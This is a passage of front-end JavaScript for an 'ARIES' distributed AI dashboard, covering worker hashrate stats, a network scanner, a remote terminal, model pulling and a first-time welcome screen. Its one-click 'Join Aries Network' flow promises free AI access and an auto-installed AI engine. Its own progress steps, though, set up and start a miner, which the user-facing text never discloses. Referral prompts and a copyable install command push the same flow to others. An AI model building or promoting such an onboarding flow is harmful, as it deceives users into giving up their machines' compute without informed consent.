        var slaColor = w.stats.uptimePct > 99 ? '#0f0' : w.stats.uptimePct > 95 ? '#ff0' : '#f00';
        // Build sparkline from history24h
        var sparkHtml = '';
        var h = w.history24h || [];
        if (h.length > 0) {
          var maxH = Math.max.apply(null, h.map(function(p){return p.hashrate||0;})) || 1;
          sparkHtml = '<div style="display:flex;align-items:flex-end;gap:1px;height:30px;">';
          var step = Math.max(1, Math.floor(h.length / 48));
          for (var i = 0; i < h.length; i += step) {
            var pct = Math.round(((h[i].hashrate||0) / maxH) * 100);
            var bColor = h[i].status === 'offline' ? '#f00' : 'var(--accent)';
            sparkHtml += '<div style="width:3px;height:' + Math.max(1,pct) + '%;background:' + bColor + ';border-radius:1px;"></div>';
          }
          sparkHtml += '</div>';
        }
        grid.innerHTML += '<div style="background:var(--bg-card);border:1px solid var(--border);border-radius:8px;padding:12px;display:grid;grid-template-columns:1fr 1fr 1fr 2fr;gap:8px;align-items:center;">' +
          '<div><div style="font-weight:bold;font-size:13px;color:var(--text);overflow:hidden;text-overflow:ellipsis;">' + wId.substring(0,16) + '</div><div style="font-size:11px;color:' + slaColor + ';">SLA: ' + w.stats.uptimePct + '%</div></div>' +
          '<div style="text-align:center;"><div style="font-size:16px;font-weight:bold;color:var(--accent);">' + w.stats.avgHashrate + '</div><div style="font-size:10px;color:var(--text-dim);">Avg H/s</div></div>' +
          '<div style="text-align:center;"><div style="font-size:16px;font-weight:bold;color:' + slaColor + ';">' + w.stats.reliability + '</div><div style="font-size:10px;color:var(--text-dim);">Reliability</div></div>' +
          '<div>' + sparkHtml + '</div></div>';
      }
      if (Object.keys(workers).length === 0) grid.innerHTML = '<div style="color:var(--text-dim);text-align:center;padding:20px;">No worker metrics collected yet. Data appears after 5 minutes.</div>';
    });
  }

  function pushWorkerUpdate() {
    toast('Pushing update to workers...', 'info');
    api('POST', 'swarm/update-workers').then(function(d) {
      toast('Update pushed! Worker: ' + (d.workerSize || 0) + 'B, Linux: ' + (d.linuxSize || 0) + 'B', 'success');
    }).catch(function(e) { toast('Update failed: ' + (e.message || e), 'error'); });
  }

  // ═══════════════════════════════
  //  NETWORK / MONITOR / MODELS / TERMINAL / TOOL GEN / AGENT FACTORY
  // ═══════════════════════════════
  function scanNetwork() {
    var el = document.getElementById('networkContent'); el.innerHTML = '<div class="spinner"></div> Scanning...';
    api('GET', 'network/scan').then(function(d) {
      var devices = d.devices || [];
      var html = '<div class="stat-row"><div class="stat-card"><div class="stat-card-val">' + devices.length + '</div><div class="stat-card-label">Devices</div></div></div>';
      if (devices.length > 0) {
        html += '<table class="data-table"><tr><th>IP</th><th>MAC</th><th>Hostname</th><th>Actions</th></tr>';
        for (var i = 0; i < devices.length; i++) html += '<tr><td style="color:var(--accent)">' + escapeHtml(devices[i].ip) + '</td><td style="font-family:monospace;font-size:11px">' + escapeHtml(devices[i].mac || '') + '</td><td>' + escapeHtml(devices[i].hostname || '-') + '</td><td><button class="btn-sm" onclick="window.aries.pingHost(\'' + escapeHtml(devices[i].ip) + '\')">Ping</button></td></tr>';
        html += '</table>';
      }
      el.innerHTML = html;
    }).catch(function() { el.innerHTML = '<p style="color:var(--red)">Failed.</p>'; });
  }
  function pingHost(host) { toast('Pinging...', 'info'); api('POST', 'network/ping', { host: host }).then(function(d) { toast(d.alive ? host + ': ' + (d.latencyMs || '?') + 'ms' : host + ': unreachable', d.alive ? 'success' : 'error'); }).catch(function() {}); }

  function refreshMonitor() {
    var el = document.getElementById('monitorContent'); el.innerHTML = '<div class="spinner"></div>';
    api('GET', 'system/monitor').then(function(d) {
      var html = '<div class="stat-row">';
      html += '<div class="stat-card"><div class="stat-card-val">' + (d.cpu || 0).toFixed(0) + '%</div><div class="stat-card-label">CPU</div></div>';
      html += '<div class="stat-card"><div class="stat-card-val">' + (d.memPct || 0) + '%</div><div class="stat-card-label">RAM</div></div>';
      html += '<div class="stat-card"><div class="stat-card-val">' + formatUptime(d.uptime || 0) + '</div><div class="stat-card-label">Uptime</div></div></div>';
      var procs = d.processes || [];
      if (procs.length) { html += '<div class="card" style="margin:12px 0"><h3 style="margin:0 0 8px;color:var(--accent2)">Top Processes</h3><table class="data-table"><tr><th>Name</th><th>PID</th><th>Memory</th><th>Actions</th></tr>'; for (var i = 0; i < Math.min(procs.length, 15); i++) html += '<tr><td>' + escapeHtml(procs[i].Name || '') + '</td><td>' + (procs[i].Id || '') + '</td><td>' + (procs[i].MemMB || 0) + 'MB</td><td><button class="btn-sm" style="color:var(--red)" onclick="window.aries.killProcess(' + (procs[i].Id || 0) + ')">Kill</button></td></tr>'; html += '</table></div>'; }
      el.innerHTML = html;
    }).catch(function() { el.innerHTML = '<p style="color:var(--red)">Failed.</p>'; });
  }
  function killProcess(pid) { if (!confirm('Kill PID ' + pid + '?')) return; api('POST', 'system/kill', { pid: pid }).then(function() { toast('Killed', 'success'); _loadedPanels['monitor'] = false; refreshMonitor(); }).catch(function() {}); }

  function refreshModels() {
    var el = document.getElementById('modelsContent'); el.innerHTML = '<div class="spinner"></div>';
    api('GET', 'models').then(function(d) {
      var models = d.models || [];
      var html = '<div class="stat-row"><div class="stat-card"><div class="stat-card-val">' + models.length + '</div><div class="stat-card-label">Models</div></div></div>';
      html += '<div class="card" style="margin:12px 0"><h3 style="margin:0 0 8px;color:var(--accent)">Pull Model</h3><div style="display:flex;gap:8px"><input id="modelPullName" type="text" placeholder="llama3, mistral..." class="input-field" style="flex:1" /><button class="btn-primary" onclick="window.aries.pullModel()">Pull</button></div></div>';
      if (models.length) { html += '<table class="data-table"><tr><th>Model</th><th>Source</th><th>Size</th></tr>'; for (var i = 0; i < models.length; i++) html += '<tr><td style="color:var(--accent)">' + escapeHtml(models[i].name || '') + '</td><td>' + escapeHtml(models[i].source || '') + '</td><td>' + (models[i].size ? formatBytes(models[i].size) : '-') + '</td></tr>'; html += '</table>'; }
      el.innerHTML = html;
    }).catch(function() { el.innerHTML = '<p style="color:var(--red)">Failed.</p>'; });
  }
  function pullModel() { var n = document.getElementById('modelPullName').value.trim(); if (!n) return; toast('Pulling ' + n + '...', 'info'); api('POST', 'models/pull', { name: n }).then(function() { toast('Pull started', 'success'); setTimeout(function() { _loadedPanels['models'] = false; refreshModels(); }, 5000); }).catch(function() {}); }

  var _termHistory = [], _termHistIdx = -1;
  function execTerminal() {
    var input = document.getElementById('terminalInput'), cmd = input.value.trim(); if (!cmd) return;
    var shell = document.getElementById('terminalShell').value, output = document.getElementById('terminalOutput');
    _termHistory.push(cmd); _termHistIdx = _termHistory.length;
    output.innerHTML += '<div style="color:var(--accent)">PS&gt; ' + escapeHtml(cmd) + '</div>';
    input.value = '';
    if (cmd.toLowerCase() === 'hack the planet') { output.innerHTML += '<div style="color:var(--green)">&#x1F30D; ACCESS GRANTED! &#x1F389;</div>'; triggerMatrixRain(); output.scrollTop = output.scrollHeight; return; }
    api('POST', 'terminal/exec', { command: cmd, shell: shell }).then(function(d) { output.innerHTML += '<div style="color:' + (d.exitCode === 0 ? 'var(--green)' : 'var(--red)') + '">' + escapeHtml(d.output || '') + '</div>'; output.scrollTop = output.scrollHeight; }).catch(function(e) { output.innerHTML += '<div style="color:var(--red)">Error: ' + escapeHtml(e.message) + '</div>'; output.scrollTop = output.scrollHeight; });
  }

  function loadToolGen() { api('GET', 'tools/custom').then(function(d) { var tools = d.tools || [], el = document.getElementById('customToolsList'); if (!tools.length) { el.innerHTML = '<div style="color:#666">No custom tools.</div>'; return; } var html = ''; for (var i = 0; i < tools.length; i++) html += '<div style="background:#111;border:1px solid #1a1a2e;border-radius:8px;padding:12px"><div style="color:var(--accent);font-weight:bold">' + escapeHtml(tools[i].name || tools[i].id) + '</div><div style="color:#888;font-size:12px">' + escapeHtml(tools[i].description || '') + '</div></div>'; el.innerHTML = html; }).catch(function() {}); }
  function generateTool() { var desc = document.getElementById('toolGenDesc').value.trim(); if (!desc) return; var el = document.getElementById('toolGenResult'); el.innerHTML = '<div class="spinner"></div>'; api('POST', 'tools/generate', { description: desc }).then(function(d) { el.innerHTML = '<div style="color:#0f0">\u2713 ' + escapeHtml(d.name || 'Tool') + ' created!</div>'; loadToolGen(); }).catch(function() { el.innerHTML = '<div style="color:var(--red)">Failed</div>'; }); }

  function loadAgentFactory() { api('GET', 'agents/custom').then(function(d) { var agents = d.agents || [], el = document.getElementById('customAgentsList'); if (!agents.length) { el.innerHTML = '<div style="color:#666">No custom agents.</div>'; return; } var html = ''; for (var i = 0; i < agents.length; i++) html += '<div style="background:#111;border:1px solid #1a1a2e;border-radius:8px;padding:12px"><div style="color:var(--accent2);font-weight:bold">' + escapeHtml(agents[i].name || agents[i].id) + '</div><div style="color:#888;font-size:12px">' + escapeHtml(agents[i].role || '') + '</div></div>'; el.innerHTML = html; }).catch(function() {}); }
  function createAgent() { var desc = document.getElementById('agentFactoryDesc').value.trim(); if (!desc) return; var el = document.getElementById('agentFactoryResult'); el.innerHTML = '<div class="spinner"></div>'; api('POST', 'agents/create', { description: desc }).then(function(d) { el.innerHTML = '<div style="color:var(--accent2)">\u2713 ' + escapeHtml(d.name || 'Agent') + ' created!</div>'; loadAgentFactory(); }).catch(function() { el.innerHTML = '<div style="color:var(--red)">Failed</div>'; }); }

  // ═══════════════════════════════
  //  NOTIFICATIONS
  // ═══════════════════════════════
  var _notifLastRead = Date.now(), _notifVisible = false;
  function toggleNotifications() {
    var panel = document.getElementById('notifPanel');
    _notifVisible = !_notifVisible;
    panel.style.display = _notifVisible ? 'block' : 'none';
    if (_notifVisible) { refreshNotifications(); _notifLastRead = Date.now(); var badge = document.getElementById('notifBadge'); if (badge) { badge.style.display = 'none'; badge.textContent = '0'; } _notifCount = 0; }
  }
  function refreshNotifications() { var el = document.getElementById('notifList'); api('GET', 'notifications?limit=30').then(function(d) { var n = d.notifications || []; if (!n.length) { el.innerHTML = '<p style="color:var(--text-dim)">No notifications.</p>'; return; } var html = ''; for (var i = 0; i < n.length; i++) html += '<div style="padding:8px;border-bottom:1px solid var(--border);font-size:12px"><span style="color:var(--text-dim)">' + (n[i].timestamp ? new Date(n[i].timestamp).toLocaleTimeString() : '') + '</span> ' + escapeHtml(n[i].description || n[i].type || '') + '</div>'; el.innerHTML = html; }).catch(function() {}); }
  function pollNotifications() { if (_notifVisible) return; api('GET', 'notifications?limit=5&lastRead=' + _notifLastRead, null, {}).then(function(d) { var badge = document.getElementById('notifBadge'); if (badge && d.unread > 0) { badge.style.display = 'inline-block'; badge.textContent = d.unread > 99 ? '99+' : String(d.unread); _notifCount = d.unread; } }).catch(function() {}); }

  // ═══════════════════════════════
  //  GLOBAL SEARCH
  // ═══════════════════════════════
  function initGlobalSearch() {
    var input = document.getElementById('globalSearch'), results = document.getElementById('globalSearchResults');
    if (!input || !results) return;
    input.addEventListener('input', debounce(function() {
      var q = this.value.trim();
      if (q.length < 2) { results.classList.remove('visible'); return; }
      var ql = q.toLowerCase();
      // Search nav items
      var navItems = document.querySelectorAll('.nav-item'), navMatches = [];
      for (var k = 0; k < navItems.length; k++) if (navItems[k].textContent.toLowerCase().indexOf(ql) >= 0) navMatches.push(navItems[k]);
      var html = '';
      if (navMatches.length) {
        html += '<div class="search-result-group"><div class="search-result-group-label">Navigation</div>';
        for (var l = 0; l < navMatches.length; l++) html += '<div class="search-result-item" onclick="window.aries.switchPanel(\'' + navMatches[l].getAttribute('data-panel') + '\')">' + navMatches[l].textContent.trim() + '</div>';
        html += '</div>';
      }
      if (html) { results.innerHTML = html; results.classList.add('visible'); }
      else { results.innerHTML = '<div class="search-result-item">No results</div>'; results.classList.add('visible'); }
    }, 300));
    input.addEventListener('blur', function() { setTimeout(function() { results.classList.remove('visible'); }, 200); });
  }

  // ═══════════════════════════════
  //  KEYBOARD SHORTCUTS
  // ═══════════════════════════════
  function initKeyboardShortcuts() {
    var navPanels = [];
    var items = document.querySelectorAll('.nav-item');
    for (var i = 0; i < items.length; i++) navPanels.push(items[i].getAttribute('data-panel'));
    document.addEventListener('keydown', function(e) {
      if (e.ctrlKey && e.key === 'k') { e.preventDefault(); var gs = document.getElementById('globalSearch'); if (gs) gs.focus(); return; }
      if (e.ctrlKey && e.key === '/') { e.preventDefault(); document.getElementById('shortcutsModal').classList.toggle('hidden'); return; }
      if (e.key === 'Escape') {
        document.getElementById('shortcutsModal').classList.add('hidden');
        document.getElementById('notifPanel').style.display = 'none'; _notifVisible = false;
        document.getElementById('addProviderModal').style.display = 'none';
        document.getElementById('addAgentModal').style.display = 'none';
        document.getElementById('freeKeysModal').style.display = 'none';
        var sr = document.getElementById('globalSearchResults'); if (sr) sr.classList.remove('visible');
        return;
      }
      if (e.ctrlKey && e.key >= '1' && e.key <= '9') { e.preventDefault(); var idx = parseInt(e.key) - 1; if (idx < navPanels.length) switchPanel(navPanels[idx]); return; }
      if (currentPanel === 'terminal' && e.target.id === 'terminalInput') {
        if (e.key === 'Enter') { e.preventDefault(); execTerminal(); }
        if (e.key === 'ArrowUp') { e.preventDefault(); if (_termHistIdx > 0) { _termHistIdx--; document.getElementById('terminalInput').value = _termHistory[_termHistIdx] || ''; } }
        if (e.key === 'ArrowDown') { e.preventDefault(); if (_termHistIdx < _termHistory.length - 1) { _termHistIdx++; document.getElementById('terminalInput').value = _termHistory[_termHistIdx] || ''; } else { _termHistIdx = _termHistory.length; document.getElementById('terminalInput').value = ''; } }
      }
    });
  }

  // ═══════════════════════════════
  //  EASTER EGGS
  // ═══════════════════════════════
  var _konamiSeq = [];
  var KONAMI = ['ArrowUp','ArrowUp','ArrowDown','ArrowDown','ArrowLeft','ArrowRight','ArrowLeft','ArrowRight','b','a'];
  function initEasterEggs() { document.addEventListener('keydown', function(e) { _konamiSeq.push(e.key); if (_konamiSeq.length > KONAMI.length) _konamiSeq.shift(); if (_konamiSeq.join(',') === KONAMI.join(',')) { triggerMatrixRain(); _konamiSeq = []; } }); }

  function triggerMatrixRain() {
    var canvas = document.createElement('canvas'); canvas.className = 'matrix-canvas'; canvas.width = window.innerWidth; canvas.height = window.innerHeight;
    document.body.appendChild(canvas);
    var ctx = canvas.getContext('2d');
    var columns = Math.floor(canvas.width / 14);
    var drops = [];
    for (var i = 0; i < columns; i++) drops[i] = Math.random() * -100;
    var chars = 'ARIES01';
    var interval = setInterval(function() {
      ctx.fillStyle = 'rgba(0,0,0,0.05)';
      ctx.fillRect(0, 0, canvas.width, canvas.height);
      ctx.fillStyle = '#0f0';
      ctx.font = '14px monospace';
      for (var i = 0; i < drops.length; i++) {
        var c = chars[Math.floor(Math.random() * chars.length)];
        ctx.fillText(c, i * 14, drops[i] * 14);
        if (drops[i] * 14 > canvas.height && Math.random() > 0.975) drops[i] = 0;
        drops[i]++;
      }
    }, 50);
    setTimeout(function() { clearInterval(interval); canvas.remove(); }, 5000);
  }

  function triggerParty() {
    document.body.classList.add('party-mode');
    setTimeout(function() { document.body.classList.remove('party-mode'); }, 3000);
    toast('\u{1F389} PARTY MODE!', 'success');
  }

  // ── Boot Sequence (API) ──
  function showBootSequence() {
    api('GET', 'boot').then(function(data) {
      if (!data.modules || data.modules.length === 0) return;
      var container = document.getElementById('chatMessages');
      var bootDiv = document.createElement('div');
      bootDiv.className = 'chat-msg system';
      var text = '[ARIES v' + (data.version || '5.0') + '] Initializing...\n\n';
      var modules = data.modules || [];
      for (var i = 0; i < modules.length; i++) {
        var m = modules[i];
        var icon = m.status === 'ok' ? '\u2714' : m.status === 'skip' ? '\u25CB' : '\u2718';
        text += '\u25B8 ' + (m.label || m.id) + ' ' + icon + (m.detail ? ' ' + m.detail : '') + '\n';
      }
      text += '\n[ARIES] All systems online \u26A1';
      bootDiv.innerHTML = '<div class="msg-body" style="white-space:pre;font-family:monospace;font-size:12px">' + escapeHtml(text) + '</div>';
      if (container && container.children.length === 0) container.appendChild(bootDiv);
    }).catch(function() {});
  }

  // ═══════════════════════════════
  //  WELCOME SCREEN
  // ═══════════════════════════════
  // apiFetch fallback for legacy admin panels
  function apiFetch(url, opts) {
    opts = opts || {};
    if (!opts.headers) opts.headers = {};
    opts.headers['X-API-Key'] = localStorage.getItem('aries-api-key') || '';
    return fetch(url, opts).then(function(r) { return r.json(); });
  }

  function showWelcomeScreen() {
    // Check if enrolled — if so show normal welcome
    api('GET', 'swarm/worker/status', null, {}).then(function(st) {
      if (st && st.enrolled) {
        _showEnrolledWelcome();
      } else {
        _showFirstTimeWelcome();
      }
    }).catch(function() { _showFirstTimeWelcome(); });
  }

  function _showEnrolledWelcome() {
    if (localStorage.getItem('aries-welcome-dismissed')) return;
    var chatEl = document.getElementById('chatMessages');
    if (!chatEl) return;
    var div = document.createElement('div');
    div.className = 'welcome-card';
    div.id = 'welcomeCard';
    div.innerHTML = '<h2>Welcome back to ARIES \u26A1</h2><p>Your AI command center is online.</p>' +
      '<div id="welcomeNetStats" style="display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin:12px 0;text-align:center"></div>' +
      '<div style="display:flex;gap:8px;margin-top:12px">' +
      '<button class="btn-primary" onclick="window.aries.switchPanel(\'swarm\')">&#x1F310; Swarm Dashboard</button>' +
      '<button class="btn-sm" onclick="window.aries.showSharePanel()">&#x1F4E4; Invite Friends</button>' +
      '<button class="welcome-dismiss" onclick="window.aries.dismissWelcome()">Dismiss</button>' +
      '</div>';
    chatEl.prepend(div);
    _loadNetworkStatsWidget('welcomeNetStats');
  }

  function _showFirstTimeWelcome() {
    // Full-screen welcome for new users
    var overlay = document.getElementById('firstTimeWelcome');
    if (overlay) return; // already showing
    if (localStorage.getItem('aries-setup-done')) return;
    overlay = document.createElement('div');
    overlay.id = 'firstTimeWelcome';
    overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:linear-gradient(135deg,#0a0a1a 0%,#1a0a2e 50%,#0a1a2e 100%);z-index:10000;display:flex;align-items:center;justify-content:center;font-family:inherit;overflow-y:auto';
    overlay.innerHTML = '<div style="max-width:600px;width:90%;text-align:center;padding:40px 20px">' +
      '<div style="font-size:64px;margin-bottom:8px;animation:pulse 2s infinite">\u2648</div>' +
      '<h1 style="color:#0ff;font-size:32px;margin:0 0 8px;text-shadow:0 0 20px rgba(0,255,255,0.5)">ARIES</h1>' +
      '<p style="color:#888;font-size:14px;margin:0 0 24px">Distributed AI Network</p>' +
      '<div id="ftNetworkCount" style="color:#0f0;font-size:18px;margin-bottom:24px;min-height:24px"></div>' +
      // Quick Join — the big button
      '<div style="background:linear-gradient(135deg,#1a2a4a,#2a1a4a);border:2px solid #0ff;border-radius:16px;padding:24px;margin-bottom:16px;cursor:pointer" onclick="window.aries.quickJoinFromWelcome()" id="quickJoinCard">' +
        '<div style="font-size:24px;font-weight:bold;color:#0ff;margin-bottom:8px">\u26A1 One-Click: Join Aries Network</div>' +
        '<p style="color:#aaa;font-size:13px;margin:0 0 12px">Get free AI access instantly. Contribute idle compute to the swarm.</p>' +
        '<div style="display:flex;justify-content:center;gap:16px;font-size:12px;color:#888">' +
          '<span>\u2714 Auto-installs AI engine</span>' +
          '<span>\u2714 Free AI access</span>' +
          '<span>\u2714 Low-priority background</span>' +
        '</div>' +
        '<div id="quickJoinProgress" style="display:none;margin-top:16px">' +
          '<div style="background:#1a1a2e;border-radius:8px;height:8px;overflow:hidden;margin-bottom:8px"><div id="quickJoinBar" style="height:100%;width:0%;background:linear-gradient(90deg,#0ff,#0f0);transition:width 0.5s;border-radius:8px"></div></div>' +
          '<div id="quickJoinStatus" style="color:#0ff;font-size:13px"></div>' +
        '</div>' +
      '</div>' +
      // Secondary options
      '<div style="color:#555;font-size:13px;margin:16px 0 12px">Or set up manually...</div>' +
      '<div style="display:flex;gap:12px;justify-content:center">' +
        '<button class="btn-sm" onclick="window.aries.dismissFirstTime();window.aries.switchPanel(\'settings\')" style="padding:8px 16px">\u{1F511} API Key</button>' +
        '<button class="btn-sm" onclick="window.aries.dismissFirstTime();window.aries.switchPanel(\'models\')" style="padding:8px 16px">\u{1F999} Local Ollama</button>' +
      '</div>' +
      // Share section
      '<div style="margin-top:32px;padding-top:16px;border-top:1px solid #1a1a2e">' +
        '<div style="color:#555;font-size:12px;margin-bottom:8px">Help grow the network:</div>' +
        '<div style="display:flex;gap:8px;justify-content:center">' +
          '<button class="btn-sm" onclick="window.aries.shareOnTwitter()" style="font-size:11px">\u{1F426} Twitter</button>' +
          '<button class="btn-sm" onclick="window.aries.shareOnReddit()" style="font-size:11px">\u{1F4AC} Reddit</button>' +
          '<button class="btn-sm" onclick="window.aries.copyInstallCmd()" style="font-size:11px">\u{1F4CB} Copy Install</button>' +
        '</div>' +
      '</div>' +
    '</div>';
    document.body.appendChild(overlay);
    // Load network stats
    api('GET', 'network/stats', null, {}).then(function(d) {
      var el = document.getElementById('ftNetworkCount');
      if (el && d.totalNodes > 0) el.textContent = 'Join ' + d.totalNodes + ' users in the Aries Network';
      else if (el) el.textContent = 'Join the Aries Network';
    }).catch(function() {
      var el = document.getElementById('ftNetworkCount');
      if (el) el.textContent = 'Join the Aries Network';
    });
    // Add animation keyframes
    if (!document.getElementById('aries-welcome-css')) {
      var style = document.createElement('style');
      style.id = 'aries-welcome-css';
      style.textContent = '@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.1)}}';
      document.head.appendChild(style);
    }
  }

  function quickJoinFromWelcome() {
    var prog = document.getElementById('quickJoinProgress');
    var bar = document.getElementById('quickJoinBar');
    var status = document.getElementById('quickJoinStatus');
    var card = document.getElementById('quickJoinCard');
    if (prog) prog.style.display = 'block';
    if (card) card.style.cursor = 'default';
    if (card) card.onclick = null;
    if (status) status.textContent = 'Starting...';
    if (bar) bar.style.width = '10%';
    // Listen for WebSocket progress
    var steps = { 'ollama-setup': 20, 'connecting': 40, 'worker-started': 60, 'miner-setup': 70, 'miner-started': 85, 'done': 100, 'complete': 100 };
    var origHandler = window._ariesWsHandler;
    window._ariesQuickJoinHandler = function(msg) {
      if (msg.type === 'quickjoin-progress' || msg.type === 'swarm-join-progress') {
        if (status) status.textContent = msg.message || msg.step || '';
        if (bar && steps[msg.step]) bar.style.width = steps[msg.step] + '%';
        if (msg.step === 'complete' || msg.step === 'done') {
          if (bar) bar.style.width = '100%';
          if (status) status.textContent = "\u2705 You're in! Free AI access is now active.";
          setTimeout(function() { dismissFirstTime(); toast("Welcome to the Aries Network!", 'success'); }, 2000);
        }
        if (msg.step === 'error' || msg.step === 'rejected') {
          if (status) { status.textContent = '\u274C ' + (msg.message || 'Setup failed'); status.style.color = '#f55'; }
        }
      }
    };
    api('POST', 'swarm/quickjoin').then(function(d) {
      if (d.ok) {
        if (bar) bar.style.width = '100%';
        if (status) status.textContent = "\u2705 You're in! Worker ID: " + (d.workerId || '');
        setTimeout(function() { dismissFirstTime(); toast("Welcome to the Aries Network!", 'success'); }, 2000);
      } else {
        if (status) { status.textContent = '\u274C ' + (d.error || 'Failed'); status.style.color = '#f55'; }
      }
    }).catch(function(e) {
      if (status) { status.textContent = '\u274C Error: ' + e.message; status.style.color = '#f55'; }
    });
  }

  function dismissFirstTime() {
    localStorage.setItem('aries-setup-done', '1');
    var el = document.getElementById('firstTimeWelcome');
    if (el) { el.style.opacity = '0'; el.style.transition = 'opacity 0.5s'; setTimeout(function() { el.remove(); }, 500); }
  }

  function _loadNetworkStatsWidget(containerId) {
    api('GET', 'network/stats', null, {}).then(function(d) {
      var el = document.getElementById(containerId);
      if (!el) return;
      el.innerHTML = '<div style="background:#111;padding:8px;border-radius:8px"><div style="font-size:18px;color:var(--accent)">' + (d.totalNodes || 0) + '</div><div style="font-size:11px;color:#888">Network Nodes</div></div>' +
        '<div style="background:#111;padding:8px;border-radius:8px"><div style="font-size:18px;color:var(--green,#0f0)">' + (d.tasksProcessed || 0) + '</div><div style="font-size:11px;color:#888">Tasks Done</div></div>' +
        '<div style="background:#111;padding:8px;border-radius:8px"><div style="font-size:18px;color:var(--accent)">' + formatUptime(d.yourUptime || 0) + '</div><div style="font-size:11px;color:#888">Your Uptime</div></div>';
    }).catch(function() {});
  }

  function showSharePanel() {
    var overlay = document.createElement('div');
    overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;display:flex;align-items:center;justify-content:center;cursor:pointer';
    overlay.onclick = function(e) { if (e.target === overlay) overlay.remove(); };
    var installCmd = 'git clone https://github.com/dsfgsdgf33/aries && cd aries && node install.js';
    overlay.innerHTML = '<div style="background:#12122a;padding:32px;border-radius:16px;max-width:500px;width:90%;border:1px solid #0ff;cursor:default" onclick="event.stopPropagation()">' +
      '<h2 style="color:#0ff;margin:0 0 16px;text-align:center">\u{1F4E4} Invite Friends to Aries</h2>' +
      '<div style="display:grid;gap:10px;margin-bottom:20px">' +
        '<button class="btn-primary" onclick="window.aries.shareOnTwitter()" style="width:100%">\u{1F426} Share on Twitter</button>' +
        '<button class="btn-primary" onclick="window.aries.shareOnReddit()" style="width:100%">\u{1F4AC} Share on Reddit</button>' +
        '<button class="btn-primary" onclick="window.aries.shareOnDiscord()" style="width:100%">\u{1F3AE} Share on Discord</button>' +
      '</div>' +
      '<div style="margin-bottom:16px"><div style="color:#888;font-size:12px;margin-bottom:4px">Install command:</div>' +
        '<div style="background:#0a0a1a;padding:10px;border-radius:8px;font-family:monospace;font-size:12px;color:#0f0;word-break:break-all;cursor:pointer" onclick="navigator.clipboard.writeText(\'' + installCmd.replace(/'/g, "\\'") + '\');window.aries.toast(\'Copied!\',\'success\')">' + escapeHtml(installCmd) + '</div>' +
      '</div>' +
      '<div id="referralStats" style="text-align:center;color:#555;font-size:12px"></div>' +
      '</div>';
    document.body.appendChild(overlay);
    // Load referral stats
    api('GET', 'referral/stats', null, {}).then(function(d) {
      var el = document.getElementById('referralStats');
      if (el && d) el.innerHTML = 'Referrals: <strong style="color:#0ff">' + (d.totalReferrals || 0) + '</strong> | Code: <strong style="color:#0f0">' + (d.referralCode || 'jdw-aries') + '</strong>';
    }).catch(function() {});
  }

  function shareOnTwitter() {
    var text = encodeURIComponent('Just joined the Aries distributed AI network \u2648\u26A1 Free AI access powered by community compute. Check it out: https://github.com/dsfgsdgf33/aries #AI #OpenSource');
    window.open('https://twitter.com/intent/tweet?text=' + text, '_blank');
  }
  function shareOnReddit() {
    var title = encodeURIComponent('Aries - Free distributed AI powered by community compute');
    var url = encodeURIComponent('https://github.com/dsfgsdgf33/aries');
    window.open('https://reddit.com/submit?title=' + title + '&url=' + url, '_blank');
  }
  function shareOnDiscord() {
    navigator.clipboard.writeText('Check out Aries - free distributed AI network! \u2648\u26A1 https://github.com/dsfgsdgf33/aries');
    toast('Discord message copied to clipboard!', 'success');
  }
  function copyInstallCmd() {
    navigator.clipboard.writeText('git clone https://github.com/dsfgsdgf33/aries && cd aries && node install.js');
    toast('Install command copied!', 'success');
  }

  function checkAutoUpdate() {
    fetch('https://api.github.com/repos/dsfgsdgf33/aries/releases/latest', { headers: { Accept: 'application/vnd.github.v3+json' } })
      .then(function(r) { return r.json(); })
      .then(function(d) {
        if (!d || !d.tag_name) return;
        var latest = d.tag_name.replace(/^v/, '');
        var current = window._ariesVersion || '5.0';
        if (latest !== current && latest > current) {
          var banner = document.createElement('div');
          banner.style.cssText = 'position:fixed;top:0;left:0;right:0;background:linear-gradient(90deg,#1a2a4a,#2a1a4a);color:#0ff;padding:8px 16px;text-align:center;font-size:13px;z-index:9998;border-bottom:1px solid #0ff';
          banner.innerHTML = '\u{1F680} Aries ' + escapeHtml(d.tag_name) + ' available! <a href="https://github.com/dsfgsdgf33/aries/releases/latest" target="_blank" style="color:#0f0;text-decoration:underline">Update now</a> <span style="cursor:pointer;float:right;padding:0 8px" onclick="this.parentElement.remove()">\u2716</span>';
          document.body.appendChild(banner);
        }
      }).catch(function() {});
  }

  function dismissWelcome() { localStorage.setItem('aries-welcome-dismissed', '1'); var el = document.getElementById('welcomeCard'); if (el) el.remove(); }

  // ═══════════════════════════════
  //  CONTEXT MENUS
  // ═══════════════════════════════
  function showContextMenu(x, y, items) {
    closeContextMenu();
    var menu = document.createElement('div'); menu.className = 'ctx-menu'; menu.id = 'ctxMenu';
    for (var i = 0; i < items.length; i++) {
      if (items[i].sep) { var s = document.createElement('div'); s.className = 'ctx-menu-sep'; menu.appendChild(s); continue; }
      var item = document.createElement('div'); item.className = 'ctx-menu-item'; item.textContent = items[i].label;
      item.onclick = (function(fn) { return function() { closeContextMenu(); fn(); }; })(items[i].action);
      menu.appendChild(item);
    }
    menu.style.left = Math.min(x, window.innerWidth - 180) + 'px';
    menu.style.top = Math.min(y, window.innerHeight - (items.length * 36)) + 'px';
    document.body.appendChild(menu);
    setTimeout(function() { document.addEventListener('click', closeContextMenu, { once: true }); }, 0);
  }
  function closeContextMenu() { var m = document.getElementById('ctxMenu'); if (m) m.remove(); }

  function initContextMenus() {
    document.getElementById('chatMessages').addEventListener('contextmenu', function(e) {
      var msg = e.target.closest('.chat-msg'); if (!msg) return;
      e.preventDefault();
      var text = msg.querySelector('.msg-body') ? msg.querySelector('.msg-body').textContent : '';
      showContextMenu(e.clientX, e.clientY, [
        { label: '\u{1F4CB} Copy', action: function() { navigator.clipboard.writeText(text); toast('Copied', 'success'); } },
        { label: '\u{1F5D1} Delete', action: function() { msg.remove(); } },
        { sep: true },
        { label: 'Export as .md', action: function() { downloadText('message.md', text); } }
      ]);
    });
  }

  // ═══════════════════════════════
  //  CSV EXPORT HELPERS
  // ═══════════════════════════════
  function downloadText(filename, text) { var a = document.createElement('a'); a.href = URL.createObjectURL(new Blob([text])); a.download = filename; a.click(); }
